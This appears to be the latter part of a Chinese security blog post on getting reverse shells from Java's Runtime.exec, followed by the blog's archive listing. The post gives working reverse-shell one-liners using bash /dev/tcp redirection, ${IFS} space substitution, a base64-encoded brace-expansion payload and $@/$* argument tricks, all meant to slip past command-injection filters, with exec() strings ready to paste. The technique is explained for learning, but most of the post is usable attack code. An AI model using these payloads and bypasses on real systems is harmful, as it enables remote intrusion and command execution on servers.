+<p>注意到<code>文件描述符的复制</code>中<code>[n]&lt;&amp;word</code>格式，我们可以将 socks 文件描述符复制到 stdin 中</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345 0<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1
+
+<span class="token comment" spellcheck="true"># 添加 IFS</span>
+<span class="token function">bash</span><span class="token variable">${IFS}</span>-i<span class="token variable">${IFS}</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token variable">${IFS}</span>/dev/tcp/127.0.0.1/12345<span class="token variable">${IFS}</span>0<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1</code></pre>
+<p>同时由于 n 默认为 stdin，那么我们也可以利用此规则不出现 0</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345 <span class="token operator">&lt;</span><span class="token operator">&amp;</span>1
+
+<span class="token comment" spellcheck="true"># 添加 IFS</span>
+<span class="token function">bash</span><span class="token variable">${IFS}</span>-i<span class="token variable">${IFS}</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token variable">${IFS}</span>/dev/tcp/127.0.0.1/12345<span class="token variable">${IFS}</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span>1</code></pre>
+<p>甚至省略最后的空格，以及非必要的空格</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1
+
+<span class="token comment" spellcheck="true"># 添加 IFS</span>
+<span class="token function">bash</span><span class="token variable">${IFS}</span>-i<span class="token variable">${IFS}</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token variable">${IFS}</span>/dev/tcp/127.0.0.1/12345<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1
+
+<span class="token comment" spellcheck="true"># 省略非必要空格+IFS 测试</span>
+test@test:~$ <span class="token function">bash</span><span class="token variable">${IFS}</span>-i<span class="token operator">></span><span class="token operator">&amp;</span>/dev/tcp/127.0.0.1/12345<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1
+
+test@test:~$ <span class="token function">ls</span> -l /proc/14556/fd
+总用量 0
+lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2月  27 23:08 0 -<span class="token operator">></span> <span class="token string">'socket:[928815]'</span>
+lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2月  27 23:08 1 -<span class="token operator">></span> <span class="token string">'socket:[928815]'</span>
+lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2月  27 23:08 2 -<span class="token operator">></span> <span class="token string">'socket:[928815]'</span>
+lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2月  27 23:08 255 -<span class="token operator">></span> /dev/tty</code></pre>
+<h3 id="bash-Brace-Expansion"><a href="#bash-Brace-Expansion" class="headerlink" title="bash Brace Expansion"></a>bash Brace Expansion</h3><p>花括号扩展，详细见参考资料 3</p>
+<pre class=" language-shell"><code class="language-shell">test@test:~$ echo hello{'world','linux'},
+helloworld, hellolinux,
+test@test:~$ echo hello{1..5},
+hello1, hello2, hello3, hello4, hello5,</code></pre>
+<pre class=" language-shell"><code class="language-shell">test@test:~$ bash -c "{echo,YmFzaCAtaT4mL2Rldi90Y3AvMTI3LjAuMC4xLzEyMzQ1PCYxCg==}|{base64,-d}|{bash,-i}"
+
+Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaT4mL2Rldi90Y3AvMTI3LjAuMC4xLzEyMzQ1PCYxCg==}|{base64,-d}|{bash,-i}");</code></pre>
+<h3 id><a href="#" class="headerlink" title="$@ $*"></a><code>$@</code> <code>$*</code></h3><p>细节及区别详见：<a href="http://c.biancheng.net/cpp/view/2739.html" target="_blank" rel="noopener">Shell特殊变量</a></p>
+<table>
+<thead>
+<tr>
+<th>参数处理</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>$*</code></td>
+<td>以一个单字符串显示所有向脚本传递的参数。<br>如<code>$*</code>用<code>&quot;</code>括起来的情况、以<code>$1 $2 … $n</code>的形式输出所有参数。</td>
+</tr>
+<tr>
+<td><code>$@</code></td>
+<td>与<code>$*</code>相同，但是使用时加引号，并在引号中返回每个参数。<br>如<code>$@</code>用<code>&quot;</code>括起来的情况、以<code>&quot;$1&quot; &quot;$2&quot; … &quot;$n&quot;</code>的形式输出所有参数。</td>
+</tr>
+</tbody></table>
+<p>以下内容来自</p>
+<p>那么我们就可以利用来反弹shell了。看bash语法：</p>
+<pre class=" language-shell"><code class="language-shell">bash [options] [command_string | file]
+-c   If the -c option is present, then commands are read from the first non-option argument command_string.If there are arguments after the command_string, they are assigned to the positional parameters, starting with $0.</code></pre>
+<p>结合bash和$@，我们可以变为：</p>
+<pre class=" language-shell"><code class="language-shell">/bin/sh -c '$@|sh' xxx  echo ls</code></pre>
+<p>可以成功地执行<code>ls</code>。分析下这个命令，当<code>bash</code>解析到<code>&#39;$@|sh&#39; xxx echo ls</code>，发现<code>$@</code>。<code>$@</code>需要取脚本的参数，那么就会解析<code>xxx echo ls</code>，由于<code>$@</code>只会取脚本参数，会将第一个参数认为是脚本名称<strong>(认为<code>xxx</code>是脚本名称)</strong>，就会取到<code>echo ls</code>。那么最终执行的就是<code>echo ls|sh</code>，就可以成功地执行<code>ls</code>命令了。</p>
+<p>利用上面这个<code>trick</code>，那么我们就可以执行任意命令了，包括反弹shell。如<code>/bin/bash -c &#39;$@|bash&#39; 0 echo &#39;bash -i &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1&#39;</code>最终可以成功地反弹shell</p>
+<pre class=" language-shell"><code class="language-shell">Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/8888 0>&1");
+
+Runtime.getRuntime().exec("/bin/bash -c $*|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/8888 0>&1");</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15831418726956.jpg" alt="-w974"></p>
+<p>最终相当于执行了<code>echo &#39;bash -i &gt;&amp;/dev/tcp/127.0.0.1/8888 0&gt;&amp;1&#39;|bash</code>命令，成功反弹shell</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol>
+<li><a href="https://xz.aliyun.com/t/2548#toc-0" target="_blank" rel="noopener">Linux反弹shell（一）文件描述符与重定向</a></li>
+<li><a href="https://xz.aliyun.com/t/2549#toc-8" target="_blank" rel="noopener">Linux 反弹shell（二）反弹shell的本质</a></li>
+<li><a href="https://www.cnblogs.com/leixiao-/p/10216571.html" target="_blank" rel="noopener">linux下形如{command,parameter,parameter}执行命令 / bash花括号扩展</a></li>
+<li><a href="https://blog.spoock.com/2018/11/25/getshell-bypass-exec/" target="_blank" rel="noopener">绕过exec获取反弹shell</a></li>
+</ol>
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://blog.sari3l.com">Sariel.D</a>
+            <p>原文链接：<a href="https://blog.sari3l.com/posts/91ba290f/">https://blog.sari3l.com/posts/91ba290f/</a>
+            <p>发表日期：<a href="https://blog.sari3l.com/posts/91ba290f/">March 2nd 2020, 10:47:18 pm</a>
+            <p>更新日期：<a href="https://blog.sari3l.com/posts/91ba290f/">July 6th 2020, 5:45:18 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/posts/fa80d225/" title= "CVE-2020-2555 简单分析">
+                    <div class="nextTitle">CVE-2020-2555 简单分析</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/posts/56fcf5d8/" title= "Thinkphp 5.0.x 反序列化简析">
+                    <div class="prevTitle">Thinkphp 5.0.x 反序列化简析</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:master@mail.sari3l.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/sari3l" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://www.instagram.com/x3rias" class="iconfont-archer instagram" target="_blank" title=instagram></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#重定向"><span class="toc-number">1.</span> <span class="toc-text">重定向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-输入重定向"><span class="toc-number">1.1.</span> <span class="toc-text">1. 输入重定向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-输出重定向"><span class="toc-number">1.2.</span> <span class="toc-text">2. 输出重定向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-标准输出与标准错误输出重定向"><span class="toc-number">1.3.</span> <span class="toc-text">3. 标准输出与标准错误输出重定向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-文件描述符的复制"><span class="toc-number">1.4.</span> <span class="toc-text">4. 文件描述符的复制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-打开文件描述符进行读写"><span class="toc-number">1.5.</span> <span class="toc-text">5. 打开文件描述符进行读写</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反弹"><span class="toc-number">2.</span> <span class="toc-text">反弹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#文件描述符复制"><span class="toc-number">2.1.</span> <span class="toc-text">文件描述符复制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件描述符复制-2"><span class="toc-number">2.2.</span> <span class="toc-text">文件描述符复制 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绑定重定向"><span class="toc-number">2.3.</span> <span class="toc-text">绑定重定向</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#额外的例子"><span class="toc-number">2.3.1.</span> <span class="toc-text">额外的例子</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他"><span class="toc-number">2.4.</span> <span class="toc-text">其他</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反弹-in-Java"><span class="toc-number">3.</span> <span class="toc-text">反弹 in Java</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Runtime-getRuntime-exec"><span class="toc-number">3.1.</span> <span class="toc-text">Runtime.getRuntime().exec</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exec-new-String"><span class="toc-number">3.1.1.</span> <span class="toc-text">exec(new String[])</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exec-new-String-1"><span class="toc-number">3.1.2.</span> <span class="toc-text">exec(new String)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-number">4.</span> <span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IFS"><span class="toc-number">4.1.</span> <span class="toc-text">${IFS}</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bash-Brace-Expansion"><span class="toc-number">4.2.</span> <span class="toc-text">bash Brace Expansion</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">4.3.</span> <span class="toc-text">$@ $*</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-number">5.</span> <span class="toc-text">参考资料</span></a></li></ol> -->
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#重定向"><span class="toc-text">重定向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-输入重定向"><span class="toc-text">1. 输入重定向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-输出重定向"><span class="toc-text">2. 输出重定向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-标准输出与标准错误输出重定向"><span class="toc-text">3. 标准输出与标准错误输出重定向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-文件描述符的复制"><span class="toc-text">4. 文件描述符的复制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-打开文件描述符进行读写"><span class="toc-text">5. 打开文件描述符进行读写</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反弹"><span class="toc-text">反弹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#文件描述符复制"><span class="toc-text">文件描述符复制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件描述符复制-2"><span class="toc-text">文件描述符复制 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绑定重定向"><span class="toc-text">绑定重定向</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#额外的例子"><span class="toc-text">额外的例子</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他"><span class="toc-text">其他</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反弹-in-Java"><span class="toc-text">反弹 in Java</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Runtime-getRuntime-exec"><span class="toc-text">Runtime.getRuntime().exec</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exec-new-String"><span class="toc-text">exec(new String[])</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exec-new-String-1"><span class="toc-text">exec(new String)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IFS"><span class="toc-text">${IFS}</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bash-Brace-Expansion"><span class="toc-text">bash Brace Expansion</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-text">$@ $*</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-text">参考资料</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 74
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/15</span><a class="archive-post-title" href= "/posts/9a92d107/" >🔐</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/15</span><a class="archive-post-title" href= "/posts/fd03bf87/" >🔐</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/12</span><a class="archive-post-title" href= "/posts/df08045a/" >🔐</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/posts/787c7e6c/" >🔐</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/posts/55ea3bd4/" >Shiro-055 分析&回显</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/posts/6712089c/" >深信服 EDR RCE 简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/04</span><a class="archive-post-title" href= "/posts/c5e878c3/" >CobaltStrike Argue 原理 - 翻译文</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/02</span><a class="archive-post-title" href= "/posts/afd91327/" >Github Page 加速</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span><a class="archive-post-title" href= "/posts/76ce816c/" >CobaltStrike 破解步骤</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/13</span><a class="archive-post-title" href= "/posts/b7ea5c49/" >一道题回顾智能合约 Coverage</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/06</span><a class="archive-post-title" href= "/posts/58a67794/" >F5 BIG-IP RCE简单分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/17</span><a class="archive-post-title" href= "/posts/608d18f0/" >用友NC反序列化 简单分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/14</span><a class="archive-post-title" href= "/posts/d4fb29f2/" >Pwnable.kr 之 Toddler's Bottle</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/posts/ecb4dfa2/" >Weblogic T3 协议学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/20</span><a class="archive-post-title" href= "/posts/e32c5d3e/" >CVE-2020-2551 简单分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/12</span><a class="archive-post-title" href= "/posts/fa80d225/" >CVE-2020-2555 简单分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href= "/posts/91ba290f/" >Java 反弹 Shell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span><a class="archive-post-title" href= "/posts/56fcf5d8/" >Thinkphp 5.0.x 反序列化简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/22</span><a class="archive-post-title" href= "/posts/7d9ef63e/" >CVE-2020-1938（Ghost Cat）简单分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/17</span><a class="archive-post-title" href= "/posts/2cc5b12d/" >JDBC Deserialization</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/16</span><a class="archive-post-title" href= "/posts/f0f80c65/" >Abusing MySQL clients RCE</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/posts/f33694e6/" >2020 All is New</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/25</span><a class="archive-post-title" href= "/posts/418c3786/" >对 Cookie 的一点学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/18</span><a class="archive-post-title" href= "/posts/1e8439b5/" >HTTP Smuggling Attack 随笔</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/10</span><a class="archive-post-title" href= "/posts/b61194b/" >ThinkPHP 6.0.x 反序列化简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/posts/4457d4a3/" >ThinkPHP 5.1.x 反序列化简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/31</span><a class="archive-post-title" href= "/posts/a3557ae1/" >记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/12</span><a class="archive-post-title" href= "/posts/9622f295/" >Mysql 注入基础小结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/03</span><a class="archive-post-title" href= "/posts/a62f29f1/" >XSS with ServiceWorkers</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/posts/66ad34dc/" >CSP 小结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/07</span><a class="archive-post-title" href= "/posts/13977d3a/" >SVG with HTML Parsing</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href= "/posts/76496c2b/" >Fastjson 新反序列化漏洞解析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/16</span><a class="archive-post-title" href= "/posts/85fdfb64/" >SSRF 小结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/13</span><a class="archive-post-title" href= "/posts/d8415c32/" >Discuz! ML 3.x 命令执行简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/10</span><a class="archive-post-title" href= "/posts/fb0090e/" >Redis Rce 简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/02</span><a class="archive-post-title" href= "/posts/8dea0d95/" >Sqlmap --os-shell 原理简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
